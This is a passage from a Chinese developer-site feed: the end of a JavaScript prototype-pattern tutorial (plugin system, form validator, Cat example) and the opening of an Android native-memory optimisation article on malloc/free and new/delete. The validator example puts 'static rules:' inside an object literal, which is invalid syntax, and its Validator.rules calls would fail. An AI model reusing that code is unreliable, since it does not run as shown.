    <span class="hljs-comment">// 注册插件</span>
    <span class="hljs-attr">register</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">plugin</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> plugin.<span class="hljs-property">install</span> === <span class="hljs-string">'function'</span>) {
            plugin.<span class="hljs-title function_">install</span>(<span class="hljs-variable language_">this</span>);
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">push</span>(plugin);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 添加钩子</span>
    <span class="hljs-attr">addHook</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name, callback</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name]) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name] = [];
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name].<span class="hljs-title function_">push</span>(callback);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 触发钩子</span>
    <span class="hljs-attr">triggerHook</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name, ...args</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name]) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>[name].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
                callback.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
            });
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 获取所有插件</span>
    <span class="hljs-attr">getPlugins</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">slice</span>(); <span class="hljs-comment">// 返回副本</span>
    }
};

<span class="hljs-comment">// 插件示例</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">LoggerPlugin</span> = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Logger'</span>,
    <span class="hljs-attr">install</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">system</span>) {
        system.<span class="hljs-title function_">addHook</span>(<span class="hljs-string">'beforeAction'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">action</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Logger] 即将执行: <span class="hljs-subst">${action}</span>`</span>);
        });
        
        system.<span class="hljs-title function_">addHook</span>(<span class="hljs-string">'afterAction'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">action, result</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Logger] 执行完成: <span class="hljs-subst">${action}</span>, 结果:`</span>, result);
        });
    }
};

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ValidatorPlugin</span> = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Validator'</span>,
    <span class="hljs-attr">install</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">system</span>) {
        system.<span class="hljs-title function_">addHook</span>(<span class="hljs-string">'beforeAction'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">action</span>) {
            <span class="hljs-keyword">if</span> (!action) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Action不能为空'</span>);
            }
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Validator] 验证通过: <span class="hljs-subst">${action}</span>`</span>);
        });
    }
};

<span class="hljs-comment">// 使用插件系统</span>
<span class="hljs-keyword">const</span> system = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginSystem</span>();
system.<span class="hljs-title function_">register</span>(<span class="hljs-title class_">LoggerPlugin</span>)
     .<span class="hljs-title function_">register</span>(<span class="hljs-title class_">ValidatorPlugin</span>);

system.<span class="hljs-title function_">triggerHook</span>(<span class="hljs-string">'beforeAction'</span>, <span class="hljs-string">'用户登录'</span>);
<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">// [Logger] 即将执行: 用户登录</span>
<span class="hljs-comment">// [Validator] 验证通过: 用户登录</span>

<span class="hljs-comment">// 所有PluginSystem实例共享原型方法，但各有自己的插件和钩子</span>
</code></pre>
<h4 data-id="heading-48">4.6.2 表单验证系统</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Validator</span>(<span class="hljs-params">rules</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span> = rules || {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span> = {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span> = <span class="hljs-literal">true</span>;
}

<span class="hljs-title class_">Validator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Validator</span>,
    
    <span class="hljs-comment">// 添加验证规则</span>
    <span class="hljs-attr">addRule</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">field, ruleFn, message</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field]) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field] = [];
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field].<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">validate</span>: ruleFn,
            <span class="hljs-attr">message</span>: message
        });
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-comment">// 验证字段</span>
    <span class="hljs-attr">validateField</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">field, value</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field]) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-keyword">let</span> isValid = <span class="hljs-literal">true</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>[field] = [];
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> rule <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[field]) {
            <span class="hljs-keyword">if</span> (!rule.<span class="hljs-title function_">validate</span>(value)) {
                isValid = <span class="hljs-literal">false</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>[field].<span class="hljs-title function_">push</span>(rule.<span class="hljs-property">message</span>);
            }
        }
        
        <span class="hljs-keyword">if</span> (!isValid) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span> = <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-keyword">return</span> isValid;
    },
    
    <span class="hljs-comment">// 验证整个表单</span>
    <span class="hljs-attr">validateForm</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span> = {};
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span> = <span class="hljs-literal">true</span>;
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> field <span class="hljs-keyword">in</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateField</span>(field, data[field]);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isValid</span>;
    },
    
    <span class="hljs-comment">// 获取错误信息</span>
    <span class="hljs-attr">getErrors</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>;
    },
    
    <span class="hljs-comment">// 获取字段的错误</span>
    <span class="hljs-attr">getFieldError</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">field</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">errors</span>[field] || [];
    },
    
    <span class="hljs-comment">// 静态方法：常用验证规则</span>
    <span class="hljs-keyword">static</span> <span class="hljs-attr">rules</span>: {
        <span class="hljs-attr">required</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
            <span class="hljs-keyword">return</span> value !== <span class="hljs-literal">undefined</span> &amp;&amp; value !== <span class="hljs-literal">null</span> &amp;&amp; value !== <span class="hljs-string">''</span>;
        },
        
        <span class="hljs-attr">minLength</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">min</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
                <span class="hljs-keyword">return</span> value &amp;&amp; value.<span class="hljs-property">length</span> &gt;= min;
            };
        },
        
        <span class="hljs-attr">maxLength</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">max</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
                <span class="hljs-keyword">return</span> !value || value.<span class="hljs-property">length</span> &lt;= max;
            };
        },
        
        <span class="hljs-attr">email</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) {
            <span class="hljs-keyword">const</span> emailRegex = <span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>;
            <span class="hljs-keyword">return</span> !value || emailRegex.<span class="hljs-title function_">test</span>(value);
        }
    }
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> formValidator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Validator</span>();

<span class="hljs-comment">// 添加验证规则</span>
formValidator
    .<span class="hljs-title function_">addRule</span>(<span class="hljs-string">'username'</span>, 
        <span class="hljs-title class_">Validator</span>.<span class="hljs-property">rules</span>.<span class="hljs-property">required</span>, 
        <span class="hljs-string">'用户名不能为空'</span>)
    .<span class="hljs-title function_">addRule</span>(<span class="hljs-string">'username'</span>,
        <span class="hljs-title class_">Validator</span>.<span class="hljs-property">rules</span>.<span class="hljs-title function_">minLength</span>(<span class="hljs-number">3</span>),
        <span class="hljs-string">'用户名至少3个字符'</span>)
    .<span class="hljs-title function_">addRule</span>(<span class="hljs-string">'email'</span>,
        <span class="hljs-title class_">Validator</span>.<span class="hljs-property">rules</span>.<span class="hljs-property">email</span>,
        <span class="hljs-string">'邮箱格式不正确'</span>);

<span class="hljs-comment">// 验证数据</span>
<span class="hljs-keyword">const</span> formData = {
    <span class="hljs-attr">username</span>: <span class="hljs-string">'ab'</span>,
    <span class="hljs-attr">email</span>: <span class="hljs-string">'invalid-email'</span>
};

<span class="hljs-keyword">const</span> isValid = formValidator.<span class="hljs-title function_">validateForm</span>(formData);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'验证结果:'</span>, isValid); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'错误信息:'</span>, formValidator.<span class="hljs-title function_">getErrors</span>());
<span class="hljs-comment">// 输出：{ username: ['用户名至少3个字符'], email: ['邮箱格式不正确'] }</span>
</code></pre>
<h3 data-id="heading-49">4.7 原型模式的优缺点总结</h3>
<h4 data-id="heading-50">优点：</h4>
<ol>
<li><strong>内存高效</strong>：方法只在原型上存储一次，所有实例共享</li>
<li><strong>动态性</strong>：可以随时修改原型，影响所有实例</li>
<li><strong>代码复用</strong>：共享方法减少重复代码</li>
<li><strong>继承基础</strong>：为JavaScript的继承机制提供基础</li>
</ol>
<h4 data-id="heading-51">缺点：</h4>
<ol>
<li><strong>理解难度</strong>：原型链概念对初学者不友好</li>
<li><strong>共享状态的陷阱</strong>：如果原型上有引用类型属性，所有实例共享</li>
<li><strong>构造函数与原型分离</strong>：定义分散在两个地方</li>
<li><strong>性能考虑</strong>：过深原型链会影响属性查找速度</li>
</ol>
<h4 data-id="heading-52">适用场景：</h4>
<ol>
<li><strong>需要创建大量相似对象</strong>：如游戏中的NPC、UI组件</li>
<li><strong>对象有大量共享方法</strong>：如数据模型、工具类</li>
<li><strong>需要动态扩展对象能力</strong>：如插件系统</li>
<li><strong>实现继承机制</strong>：构建对象层次结构</li>
</ol>
<h3 data-id="heading-53">4.8 原型模式与构造函数的结合</h3>
<p>在实际开发中，我们总是将构造函数和原型模式结合使用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 最佳实践：构造函数 + 原型模式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color, age</span>) {
    <span class="hljs-comment">// 构造函数：处理实例特有属性</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age || <span class="hljs-number">1</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>(); <span class="hljs-comment">// 唯一ID</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createdAt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
}

<span class="hljs-comment">// 原型：处理共享方法和属性</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>, <span class="hljs-comment">// 重要：保持constructor指向</span>
    
    <span class="hljs-comment">// 共享属性</span>
    <span class="hljs-attr">species</span>: <span class="hljs-string">'猫科动物'</span>,
    <span class="hljs-attr">hasTail</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">legs</span>: <span class="hljs-number">4</span>,
    
    <span class="hljs-comment">// 共享方法</span>
    <span class="hljs-title function_">eat</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>在吃<span class="hljs-subst">${food}</span>`</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 支持链式调用</span>
    },
    
    <span class="hljs-title function_">sleep</span>(<span class="hljs-params">hours</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>睡了<span class="hljs-subst">${hours}</span>小时`</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.color}</span>色，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>;
    },
    
    <span class="hljs-comment">// 计算属性</span>
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">isKitten</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> &lt; <span class="hljs-number">1</span>;
    },
    
    <span class="hljs-comment">// 静态方法（通过实例访问）</span>
    <span class="hljs-attr">static</span>: {
        <span class="hljs-title function_">createKitten</span>(<span class="hljs-params">name, color</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(name, color, <span class="hljs-number">0.5</span>);
        }
    }
};

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'咪咪'</span>, <span class="hljs-string">'白色'</span>, <span class="hljs-number">2</span>);
cat.<span class="hljs-title function_">eat</span>(<span class="hljs-string">'鱼'</span>).<span class="hljs-title function_">sleep</span>(<span class="hljs-number">8</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">getInfo</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'是小猫吗？'</span>, cat.<span class="hljs-property">isKitten</span>);

<span class="hljs-comment">// 验证原型链</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'name'</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'eat'</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<p>这种组合模式是现代JavaScript开发中最常用的对象创建方式，它结合了两种模式的优点，避免了各自的缺点。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Native内存优化：从“内存刺客”到“内存管家”的进阶指南]]></title>    <link>https://juejin.cn/post/7602206323460538419</link>    <guid>https://juejin.cn/post/7602206323460538419</guid>    <pubDate>2026-02-03T05:23:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602206323460538419" data-draft-id="7602177113685229619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Native内存优化：从“内存刺客”到“内存管家”的进阶指南"/> <meta itemprop="keywords" content="面试,性能优化,Android"/> <meta itemprop="datePublished" content="2026-02-03T05:23:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="顾林海"/> <meta itemprop="url" content="https://juejin.cn/user/2365804752153911"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Native内存优化：从“内存刺客”到“内存管家”的进阶指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2365804752153911/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    顾林海
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:23:18.000Z" title="Tue Feb 03 2026 05:23:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>作为Android开发者，你是否遇到过这样的窘境：APP在模拟器上跑得风生水起，一到真机就频繁卡顿、闪退，日志里还飘着 <code>OutOfMemoryError: Native heap allocation failed</code> 的红色警告？这大概率是Native内存在“搞事情”。和Java内存有GC（垃圾回收）兜底不同，Native内存是“野孩子”——分配了不释放、释放不彻底，都会让内存像积水一样越积越多，最终把APP“淹死”。</p>
<p>今天，我们就来一场Native内存优化的“深度大扫除”，从底层原理到实战技巧，从工具使用到代码优化，手把手教你搞定Native内存泄漏、内存碎片，让你的APP从“吃内存大户”变身“内存省电大户”。全程干货拉满，还穿插趣味解读和实战代码，新手也能轻松跟上！</p>
<h2 data-id="heading-1">一、先搞懂：Native内存到底是个啥？</h2>
<h3 data-id="heading-2">1.1 Java内存 vs Native内存：俩“兄弟”差别大</h3>
<p>我们常说的Android内存，主要分为Java堆（Java Heap）和Native堆（Native Heap），二者就像两个独立的“储物间”，管理规则完全不同：</p>
<ul>
<li>
<p><strong>Java堆</strong>：由虚拟机（ART/Dalvik）管理，有GC自动回收“垃圾”，开发者不用手动操心内存释放，顶多注意下内存泄漏（比如静态引用持有Activity）。但Java堆有大小限制，超出就会报Java层OOM。</p>
</li>
<li>
<p><strong>Native堆</strong>：直接向系统申请内存，不受虚拟机管理，没有自动回收机制——<strong>分配多少、释放多少，全靠开发者手动控制</strong>。它的“天花板”是设备的物理内存，看似空间更大，但一旦失控，不仅会导致APP闪退，还可能拖慢整个系统。</p>
</li>
</ul>
<p>举个通俗的例子：Java堆像小区里的“智能储物柜”，用完有人自动清理；Native堆像自己租的“私人仓库”，用完不手动收拾，东西会一直堆着，直到仓库堆满再也塞不下。</p>
<h3 data-id="heading-3">1.2 Native内存的分配与释放：核心API拆解</h3>
<p>Native内存分配主要依赖C/C++的标准库和Android的专用API，不同方式的“脾气”不同，用错了就容易出问题。我们先梳理常用的分配/释放API，避免从源头踩坑：</p>
<h4 data-id="heading-4">（1）C标准库API（最常用，也最容易漏释放）</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-comment">// 分配内存：未初始化，内容是随机值</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>; 
<span class="hljs-comment">// 分配内存：初始化所有字节为0</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">calloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> num, <span class="hljs-type">size_t</span> size)</span>; 
<span class="hljs-comment">// 重新分配内存：扩大/缩小已有内存块，可能会移动内存地址</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span>; 
<span class="hljs-comment">// 释放内存：必须和分配API成对使用，否则内存泄漏</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>; 

</code></pre>
<p>关键提醒：malloc/calloc/realloc分配的内存，必须用free释放，且只能释放一次。重复释放（同一指针free两次）会导致崩溃，释放后再使用指针（野指针）会引发未知错误，堪比“踩地雷”。</p>
<h4 data-id="heading-5">（2）C++标准库API（封装更友好，但仍需手动管理）</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span></span>

<span class="hljs-comment">// 分配内存并调用构造函数</span>
<span class="hljs-type">int</span>* p1 = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>; 
<span class="hljs-type">int</span>* p2 = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">// 分配数组</span>
<span class="hljs-comment">// 释放内存并调用析构函数</span>
<span class="hljs-keyword">delete</span> p1; 
<span class="hljs-keyword">delete</span>[] p2; <span class="hljs-comment">// 数组必须用delete[]，否则只释放首元素，内存泄漏</span>

</code></pre>
<p>这里有个经典坑：用new[]分配的数组，用delete（不带[]）释放，会导致数组中除首元素外的内存无法释放，形成“隐蔽性内存泄漏”——日志不报错，但内存会慢慢上涨，排查起来极其麻烦。</p>
<h4 data-id="heading-6">（3）Android专用API（针对性场景，需注意兼容性）</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cutils/memory.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;android/log.h&gt;</span></span>

<span class="hljs-comment">// 分配可缓存的内存，适合频繁分配/释放的小内存块</span>
